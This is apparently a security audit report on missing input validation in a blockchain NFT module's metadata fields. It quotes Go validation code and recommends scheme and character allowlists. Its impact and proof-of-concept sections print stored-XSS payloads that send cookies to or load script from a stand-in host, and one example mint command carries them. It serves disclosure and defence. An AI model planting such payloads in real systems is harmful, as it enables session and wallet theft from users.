### Title
Insufficient Input Validation on NFT Metadata Fields (`URI`, `Name`, `Data`, `Denom.Name`) Allows Stored Malicious Content Injection — (File: `x/nft/types/validation.go`)

---

### Summary

The `x/nft` module accepts arbitrary string content in NFT metadata fields (`URI`, `Name`, `Data`) and denom name (`Denom.Name`) with no character-level sanitization. `ValidateTokenURI` enforces only a length ceiling (≤ 256 bytes) but imposes no restriction on characters or URI schemes. `ValidateDenomName` enforces only non-emptiness. `MsgMintNFT` and `MsgEditNFT` perform zero validation on `Name` and `Data`. The IBC NFT transfer packet (`NonFungibleTokenPacketData`) performs no validation on `ClassUri` or `TokenUris` at all. All of these fields are stored verbatim in the chain's KV store and returned unsanitized through the public REST/gRPC API. Any frontend, explorer, or marketplace that renders these fields without its own sanitization is exposed to stored XSS, enabling an attacker to run arbitrary JavaScript in users' browsers.

---

### Finding Description

**Root cause 1 — `ValidateTokenURI` is length-only:**

```go
// x/nft/types/validation.go:77-82
func ValidateTokenURI(tokenURI string) error {
    if len(tokenURI) > MaxTokenURILen {   // MaxTokenURILen = 256
        return sdkerrors.Wrapf(ErrInvalidTokenURI, ...)
    }
    return nil
}
```

No scheme check, no character allowlist. A URI such as `javascript:fetch('https://evil.com?c='+document.cookie)` (well under 256 bytes) passes validation and is stored on-chain. [1](#0-0) 

**Root cause 2 — `ValidateDenomName` is emptiness-only:**

```go
// x/nft/types/validation.go:57-63
func ValidateDenomName(denomName string) error {
    denomName = strings.TrimSpace(denomName)
    if len(denomName) == 0 {
        return sdkerrors.Wrapf(ErrInvalidDenomName, ...)
    }
    return nil
}
```

Any non-blank string — including `<script src=//evil.com></script>` — is accepted as a denom name. [2](#0-1) 

**Root cause 3 — `MsgMintNFT.ValidateBasic` and `MsgEditNFT.ValidateBasic` skip `Name` and `Data` entirely:**

`MsgMintNFT.ValidateBasic` validates `Sender`, `Recipient`, `DenomId`, `URI`, and `Id`, but never touches `Name` or `Data`. [3](#0-2) 

`MsgEditNFT.ValidateBasic` validates `Sender`, `DenomId`, `URI`, and `Id`, but never touches `Name` or `Data`. [4](#0-3) 

**Root cause 4 — IBC NFT transfer packet performs no content validation on `ClassUri` or `TokenUris`:**

`NonFungibleTokenPacketData.ValidateBasic` only checks that `ClassId` is non-blank, that `TokenIds` is non-empty, and that the lengths of `TokenIds` and `TokenUris` match. It applies no validation whatsoever to the URI strings themselves. [5](#0-4) 

**Storage and retrieval path:**

The `BaseNFT` struct stores `Name`, `URI`, and `Data` as plain strings. [6](#0-5) 

These are written to the KV store verbatim by `setNFT` and read back by `GetNFT` with no transformation. [7](#0-6) 

They are then returned directly through the public gRPC/REST endpoint `GET /chainmain/nft/nfts/{denom_id}/{token_id}`. [8](#0-7) 

---

### Impact Explanation

An attacker mints an NFT (or issues a denom, or edits an existing NFT they own) with a malicious payload in `URI`, `Name`, or `Data` — for example:

- `URI` = `javascript:eval(atob('...base64 keylogger...'))`
- `Name` = `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`
- `Data` = `<script src=//evil.com/x.js></script>`

These payloads are stored on-chain and returned verbatim by the REST API. Any explorer (e.g., Mintscan, Etherscan-style), NFT marketplace, or wallet UI that renders NFT metadata without sanitization will execute the attacker's script in the user's browser. The attacker can steal session cookies, local storage contents (including wallet seeds cached by browser extensions), or perform phishing actions such as injecting a fake transaction-signing prompt.

The IBC path amplifies the attack surface: a malicious NFT transferred via ICS-721 (`x/nft-transfer`) carries its `TokenUris` and `ClassUri` across chains with no content validation at the packet level, propagating the payload to every chain that receives the NFT.

---

### Likelihood Explanation

Any unprivileged account can submit `MsgMintNFT`, `MsgEditNFT`, or `MsgIssueDenom` transactions. No special role or permission is required. The attack requires only a funded wallet and knowledge of the transaction format. The IBC path requires only an open ICS-721 channel, which is a standard production configuration. The attack is low-cost, permanent (the payload persists on-chain), and affects every frontend that consumes the NFT API without its own sanitization layer.

---

### Recommendation

1. **`ValidateTokenURI`**: Reject any URI whose scheme is not in an explicit allowlist (e.g., `https://`, `ipfs://`, `ar://`). Reject `javascript:`, `data:`, and bare-path URIs. [1](#0-0) 

2. **`ValidateDenomName`**: Add a character allowlist (printable Unicode excluding `<`, `>`, `"`, `'`, `` ` ``, `&`) and a maximum length. [2](#0-1) 

3. **`MsgMintNFT.ValidateBasic` / `MsgEditNFT.ValidateBasic`**: Add validation for `Name` (character allowlist + max length) and `Data` (max length; if JSON is expected, validate it is well-formed JSON with no script-injectable keys). [3](#0-2) 

4. **`NonFungibleTokenPacketData.ValidateBasic`**: Apply the same URI scheme allowlist to `ClassUri` and each element of `TokenUris`. [5](#0-4) 

---

### Proof of Concept

**Step 1 — Mint an NFT with a malicious URI (any unprivileged account):**

```bash
chain-maind tx nft mint <denom-id> <token-id> \
  --uri "javascript:fetch('https://evil.com?c='+document.cookie)" \
  --name "<img src=x onerror=alert(document.domain)>" \
  --data "<script src=//evil.com/x.js></script>" \
  --from attacker \
  --chain-id <chain-id>
```

**Step 2 — Confirm the payload is stored and returned verbatim:**

```bash
curl https://<node>/chainmain/nft/nfts/<denom-id>/<token-id>
# Response includes:
# "uri": "javascript:fetch('https://evil.com?c='+document.cookie)",
# "name": "<img src=x onerror=alert(document.domain)>",
# "data": "<script src=//evil.com/x.js></script>"
```

**Step 3 — Any frontend rendering the response without sanitization executes the payload.**

The `ValidateTokenURI` length check (`MaxTokenURILen = 256`) is the only guard on the URI field, directly mirroring the Sablier `safeAssetSymbol` length-only check (≤ 30 bytes) that was bypassed by a 30-byte `<script href=//15.rs></script>` payload. Here, a `javascript:` URI of 60 bytes passes the 256-byte limit trivially. [9](#0-8)

func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
}

func (k Keeper) NFT(c context.Context, request *types.QueryNFTRequest) (*types.QueryNFTResponse, error) {
